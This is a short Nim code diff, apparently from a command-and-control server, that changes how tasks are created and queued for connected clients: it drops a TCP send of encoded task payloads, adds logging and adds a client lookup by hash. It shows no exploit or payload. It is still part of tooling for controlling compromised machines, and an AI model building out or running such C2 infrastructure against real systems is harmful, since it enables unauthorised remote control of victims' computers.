@@ -16,7 +16,7 @@ proc sendClientTask*(client: C2Client, taskName: string, jData: JsonNode = nil):
     client: client,
     id: len(client.server.tasks),
     action: taskName,
-    status: TaskNotCompleted,
+    status: TaskCreated,
     arguments: data,
     future: new (ref Future[void]),
     output: %*{}
@@ -24,23 +24,14 @@ proc sendClientTask*(client: C2Client, taskName: string, jData: JsonNode = nil):
 
   client.server.tasks.add(createdTask)
 
-  let pl = %*
-    {
-      "task": taskName,
-      "taskId": createdTask.id,
-      "data": data
-    }
-
   for wsConnection in client.server.wsConnections:
     discard wsConnection.send($(%*{
       "event": "newtask",
       "data": %createdTask
     }))
-
-  if client.listenerType == "tcp":
-    let tcpSocket: TCPSocket = client.getTcpSocket()
-    await tcpSocket.socket.send(encode($pl) & "\r\n")
   
+  infoLog "tasked " & $client & " with " & taskName
+
   return createdTask
 
 proc awaitResponse*(task: Task) {.async.} =
@@ -50,3 +41,7 @@ proc awaitResponse*(task: Task) {.async.} =
 
 proc askToIdentify*(client: C2Client) {.async.} =
   discard await client.sendClientTask("identify")
+
+proc getClientByHash*(server: C2Server, hash: string): C2Client =
+  for client in server.clients: 
+    if client.hash == hash: return client
